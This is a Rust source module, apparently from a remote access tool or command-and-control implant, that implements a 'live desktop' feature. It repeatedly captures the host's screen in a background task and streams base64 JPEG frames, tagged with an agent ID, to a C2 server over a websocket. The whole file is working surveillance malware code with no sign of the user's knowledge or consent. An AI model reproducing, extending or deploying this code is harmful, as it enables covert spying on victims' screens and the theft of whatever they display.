use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use tokio::time::{self, Duration};
use crate::modules::screenshot_capture;
use serde_json::json;

lazy_static::lazy_static! {
    static ref LIVE_DESKTOP_ACTIVE: Arc<AtomicBool> = Arc::new(AtomicBool::new(false));
}

pub fn start_live_desktop(agent_id: String) -> Result<String, String> {
    if LIVE_DESKTOP_ACTIVE.load(Ordering::SeqCst) {
        return Err("Live desktop is already active".to_string());
    }

    LIVE_DESKTOP_ACTIVE.store(true, Ordering::SeqCst);
    
    // Spawn background task to stream frames
    let active = LIVE_DESKTOP_ACTIVE.clone();
    tokio::spawn(async move {
        let mut interval = time::interval(Duration::from_millis(500)); // ~2 FPS
        while active.load(Ordering::SeqCst) {
            interval.tick().await;
            let frame_val = tokio::task::spawn_blocking(|| {
                screenshot_capture::capture_screenshot()
            }).await.unwrap_or(None);

            if let Some(frame_val) = frame_val {
                if let Some(b64) = frame_val.get("file_b64").and_then(|v| v.as_str()) {
                    let event = json!([
                        "stream_frame",
                        {
                            "agentId": agent_id.clone(),
                            "image": format!("data:image/jpeg;base64,{}", b64)
                        }
                    ]);
                    let msg = format!("42{}", event.to_string());
                    
                    if let Some(tx) = crate::c2::websocket::WS_TX.lock().unwrap().as_ref() {
                        let _ = tx.try_send(msg);
                    }
                }
            }
        }
        println!("[Live Desktop] Stream stopped.");
    });

    Ok("Live desktop stream started".to_string())
}

pub fn stop_live_desktop() -> Result<String, String> {
    if !LIVE_DESKTOP_ACTIVE.load(Ordering::SeqCst) {
        return Err("Live desktop is not active".to_string());
    }

    LIVE_DESKTOP_ACTIVE.store(false, Ordering::SeqCst);
    Ok("Live desktop stream stopped".to_string())
}
